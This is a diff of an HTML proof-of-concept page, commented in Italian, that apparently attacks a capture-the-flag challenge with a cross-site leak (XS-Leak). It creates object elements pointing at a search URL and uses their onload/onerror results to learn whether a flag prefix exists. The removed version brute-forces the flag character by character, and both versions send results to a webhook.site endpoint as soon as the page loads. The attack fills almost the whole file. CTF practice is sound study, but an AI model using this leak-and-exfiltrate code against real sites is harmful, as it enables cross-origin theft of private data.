@@ -3,84 +3,80 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XS-Leak Brute Force Test</title>
+    <title>XS-Leak Test</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+        #result {
+            margin-top: 20px;
+            font-weight: bold;
+        }
+    </style>
 </head>
 <body>
+    <h1>XS-Leak Test</h1>
     <div id="result">In attesa di risultati...</div>
 
     <script>
-        const characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}"; // Set di caratteri da testare
-        const baseUrl = 'https://matrix.capturetheflags.site/search?s=flag{';
-        const webhookUrl = 'https://webhook.site/d1c2d4d1-02cc-4007-bf6c-1d3cc3528bad'; // Modifica con il tuo webhook
-        
-        // Funzione di leak con timeout
-        const leak = async (url, timeout = 3000) => {
+        const leak = async (url) => {
             return new Promise((resolve) => {
-                const s = document.createElement('object');
+                let s = document.createElement('object');
                 s.data = url;
-
-                const timer = setTimeout(() => {
-                    s.remove();
-                    resolve('Timeout');
-                }, timeout);
-
-                s.onload = () => {
-                    clearTimeout(timer);
-                    s.remove();
-                    resolve('Risorsa accessibile (status 200)');
+                s.onload = (e) => {
+                    e.target.remove();
+                    return resolve(0); // Risorsa accessibile
                 };
-
-                s.onerror = () => {
-                    clearTimeout(timer);
-                    s.remove();
-                    resolve('Risorsa non accessibile (status 404 o errore)');
+                s.onerror = (e) => {
+                    e.target.remove();
+                    return resolve(1); // Risorsa non accessibile
                 };
-
                 document.body.appendChild(s);
             });
         };
 
-        // Funzione per eseguire il brute-force su una certa posizione della flag con delay
-        const bruteForceFlag = async (currentFlag) => {
+        // Funzione da chiamare al caricamento della pagina
+        const testResourceLeak = async () => {
+            const url = 'https://matrix.capturetheflags.site/search?s=flag{t'; // Sostituisci con l'URL da testare
+            const result = await leak(url);
             const resultDiv = document.getElementById('result');
 
-            for (let char of characters) {
-                const testFlag = currentFlag + char;
-                const url = baseUrl + encodeURIComponent(testFlag);
-                const result = await leak(url);
-
-                if (result === 'Risorsa accessibile (status 200)') {
-                    resultDiv.textContent = `Carattere trovato: ${testFlag}`;
-                    logResult(`Carattere trovato: ${testFlag}`);
-                    
-                    // Aspetta un delay e poi continua con la prossima posizione
-                    await delay(500); // Delay di 500 ms
-                    return bruteForceFlag(testFlag);
-                }
-
-                // Delay tra un tentativo e l'altro
-                await delay(500);
+            let message;
+            if (result === 0) {
+                resultDiv.textContent = 'Risorsa accessibile (status 200)';
+                message = 'Risorsa accessibile';
+            } else {
+                resultDiv.textContent = 'Risorsa non accessibile (status 404 o errore)';
+                message = 'Risorsa non accessibile';
             }
-            resultDiv.textContent = "Tentativi esauriti senza successo.";
-            logResult("Tentativi esauriti senza successo.");
+
+            // Invia il log al server Webhook utilizzando GET
+            await logResult(message);
         };
 
-        // Funzione per inviare i log
+        // Funzione per inviare i log al Webhook
         const logResult = async (message) => {
+            const webhookUrl = 'https://webhook.site/d1c2d4d1-02cc-4007-bf6c-1d3cc3528bad'; // Sostituisci con il tuo URL di Webhook.site
             try {
+                // Costruisci l'URL con il messaggio come parametro
                 const urlWithParams = `${webhookUrl}?message=${encodeURIComponent(message)}`;
-                const response = await fetch(urlWithParams);
-                if (!response.ok) console.error('Errore invio log:', response.statusText);
+                const response = await fetch(urlWithParams, {
+                    method: 'GET', // Cambiato a GET
+                });
+
+                if (!response.ok) {
+                    console.error('Errore durante l\'invio del log:', response.statusText);
+                } else {
+                    console.log('Log inviato con successo');
+                }
             } catch (error) {
                 console.error('Errore di rete:', error);
             }
         };
 
-        // Funzione per il delay
-        const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
-
-        // Esegui il brute-force al caricamento del DOM partendo da 'flag{'
-        document.addEventListener('DOMContentLoaded', () => bruteForceFlag("flag{"));
+        // Esegui il test al caricamento del DOM
+        document.addEventListener('DOMContentLoaded', testResourceLeak);
     </script>
 </body>
 </html>
